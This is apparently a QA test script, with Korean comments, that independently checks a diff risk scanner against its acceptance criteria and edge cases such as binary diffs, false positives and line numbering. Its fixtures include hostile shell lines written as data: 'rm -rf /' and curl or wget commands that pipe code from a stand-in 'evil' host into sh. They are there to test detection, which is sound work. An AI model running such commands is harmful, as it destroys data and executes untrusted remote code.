#!/usr/bin/env python3
"""QA 독립 검증 — 브라이언. PM/Codex 산출을 신뢰하지 않고 QA 본인 입력·기준으로 재현.
대상: runs/run_Oz3JuL/diff_digest.py  스펙: phase1/design_spec.md (AC1~AC5)
원칙: 자기보고 불신 / happy path보다 경계·예외·오탐·미탐 우선 / fail-closed는 실패를 심어 확인."""
import io, json, sys, os, contextlib, importlib.util

WD = "/opt/data/projects/cc-plugin/runs/run_Oz3JuL"
spec = importlib.util.spec_from_file_location("diff_digest", os.path.join(WD, "diff_digest.py"))
dd = importlib.util.module_from_spec(spec); spec.loader.exec_module(dd)

results = []  # (id, desc, passed, detail)
def check(cid, desc, cond, detail=""):
    results.append((cid, desc, bool(cond), detail))

def run_main(argv, stdin_text=""):
    old = sys.stdin; out = io.StringIO()
    try:
        sys.stdin = io.StringIO(stdin_text)
        with contextlib.redirect_stdout(out):
            rc = dd.main(argv)
    finally:
        sys.stdin = old
    return rc, out.getvalue()

# ============ AC별 매핑 (QA 독립 입력) ============
# AC1: 2파일 diff(+3/-1, +0/-5) 통계 정확
d_ac1 = """diff --git a/alpha.py b/alpha.py
--- a/alpha.py
+++ b/alpha.py
@@ -1,2 +1,4 @@
-gone
+n1
+n2
+n3
 ctx
diff --git a/beta.py b/beta.py
--- a/beta.py
+++ b/beta.py
@@ -1,5 +0,0 @@
-x
-y
-z
-p
-q
"""
f = dd.parse_diff(d_ac1)
check("AC1", "2파일 통계 +3/-1, +0/-5 정확",
      f == [{"path":"alpha.py","added":3,"removed":1,"binary":False},
            {"path":"beta.py","added":0,"removed":5,"binary":False}], repr(f))

# AC2: 추가라인 eval 잡고, 삭제라인 eval 안 잡음
d_ac2 = """diff --git a/x.py b/x.py
--- a/x.py
+++ b/x.py
@@ -1,2 +1,2 @@
-eval(REMOVED_should_not_hit)
+eval(ADDED_should_hit)
"""
r = dd.scan_risks(d_ac2)
check("AC2a", "추가 eval 1건 포착", len(r)==1 and "ADDED" in r[0]["snippet"], repr(r))
check("AC2b", "삭제 eval 미포착", not any("REMOVED" in x["snippet"] for x in r), repr(r))

# AC3: 빈 입력 → "no changes", exit 0
rc, out = run_main([], "")
check("AC3", "빈입력 'no changes' + exit 0", rc==0 and out.strip()=="no changes", f"rc={rc} out={out!r}")

# AC4: --strict + 위험 → 2, 위험 없으면 0
rc_hit, _ = run_main(["--strict"], d_ac2)
d_clean = """diff --git a/c.py b/c.py
--- a/c.py
+++ b/c.py
@@ -1,0 +1,1 @@
+return 42
"""
rc_clean, _ = run_main(["--strict"], d_clean)
check("AC4a", "--strict+위험 → exit 2", rc_hit==2, f"rc={rc_hit}")
check("AC4b", "--strict+무위험 → exit 0", rc_clean==0, f"rc={rc_clean}")

# AC5: --json 유효 + files/risks 키
rc, out = run_main(["--json"], d_ac2)
try:
    j = json.loads(out); ok_json = "files" in j and "risks" in j
except Exception as e:
    ok_json = False; out = f"JSON ERR {e}"
check("AC5", "--json 유효 & files/risks 키", ok_json, out[:120])

# ============ QA 엣지/부정 케이스 (PM 미검증 영역) ============
# E1: 바이너리 diff → 통계 제외, binary 표기
d_bin = """diff --git a/img.png b/img.png
index 111..222 100644
Binary files a/img.png and b/img.png differ
"""
fb = dd.parse_diff(d_bin)
check("E1", "바이너리 diff → binary=True, added/removed=0",
      len(fb)==1 and fb[0]["binary"] and fb[0]["added"]==0 and fb[0]["removed"]==0, repr(fb))

# E2: @@ 헤더 없는 변칙 diff → line_no=0 이라도 위험 포착돼야
d_nohdr = """diff --git a/n.sh b/n.sh
+rm -rf /
"""
rn = dd.scan_risks(d_nohdr)
check("E2", "@@ 없는 diff에서도 rm -rf 포착", any("rm -rf" in x["snippet"] for x in rn), repr(rn))

# E3: 오탐(false positive) — 무해한 import subprocess 도 위험으로 잡히나?
d_fp = """diff --git a/imp.py b/imp.py
--- a/imp.py
+++ b/imp.py
@@ -1,0 +1,1 @@
+import subprocess  # 무해한 표준 import
"""
rfp = dd.scan_risks(d_fp)
check("E3", "[관찰]무해 'import subprocess' 오탐 여부(잡히면 오탐)",
      True, f"hits={len(rfp)} → {'오탐발생(정보성이라 스펙상 허용, 단 --strict 영향)' if rfp else '오탐없음'}")

# E4: 미탐(false negative) — 위험한데 패턴이 못 잡는 변형
d_fn = """diff --git a/e.sh b/e.sh
--- a/e.sh
+++ b/e.sh
@@ -1,0 +1,3 @@
+wget http://evil/x | sh
+curl http://evil/x |  sh
+eval  (spaced)
"""
rfn = dd.scan_risks(d_fn)
snips = [x["snippet"] for x in rfn]
check("E4a", "[관찰]wget|sh 미탐 여부", True, f"wget잡힘={any('wget' in s for s in snips)}")
check("E4b", "[관찰]curl|  sh(2space) 미탐 여부", True, f"curl2sp잡힘={any('curl' in s for s in snips)}")

# E5: line_no 정확성 — hunk 내 삭제 후 추가라인 번호
d_ln = """diff --git a/ln.py b/ln.py
--- a/ln.py
+++ b/ln.py
@@ -5,3 +5,3 @@
 keep5
-old6
+eval(x)
 keep7
"""
rln = dd.scan_risks(d_ln)
# +5부터: keep5=5(context), old6=삭제(번호안올림), eval(x)=6
check("E5", "line_no 정확(eval at new line 6)", rln and rln[0]["line_no"]==6, repr(rln))

# ============ 결과 출력 ============
print("="*60); print("QA 독립 검증 결과 (브라이언)"); print("="*60)
hard_fail = 0
for cid, desc, ok, det in results:
    obs = cid.startswith(("E3","E4"))  # 관찰항목(합불 아님)
    tag = "관찰" if obs else ("PASS" if ok else "FAIL")
    mark = "•" if obs else ("✅" if ok else "❌")
    print(f"  {mark} [{tag}] {cid}: {desc}")
    if det: print(f"        └ {det}")
    if not obs and not ok: hard_fail += 1
print("="*60)
print(f"AC/엣지 하드판정: {hard_fail}건 실패" if hard_fail else "AC/엣지 하드판정: 전부 PASS")
sys.exit(1 if hard_fail else 0)
